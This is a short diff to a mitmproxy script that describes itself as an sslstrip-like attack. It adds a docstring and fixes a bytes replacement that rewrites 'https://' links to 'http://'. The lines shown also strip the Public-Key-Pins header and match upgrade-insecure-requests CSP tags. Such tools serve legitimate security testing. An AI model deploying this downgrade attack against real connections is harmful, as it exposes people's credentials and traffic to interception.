@@ -1,3 +1,7 @@
+"""
+This script implements an sslstrip-like attack based on mitmproxy.
+https://moxie.org/software/sslstrip/
+"""
 import re
 import urllib
 
@@ -28,7 +32,7 @@ def response(flow):
     flow.response.headers.pop('Public-Key-Pins', None)
 
     # strip links in response body
-    flow.response.content = flow.response.content.replace('https://', 'http://')
+    flow.response.content = flow.response.content.replace(b'https://', b'http://')
 
     # strip meta tag upgrade-insecure-requests in response body
     csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
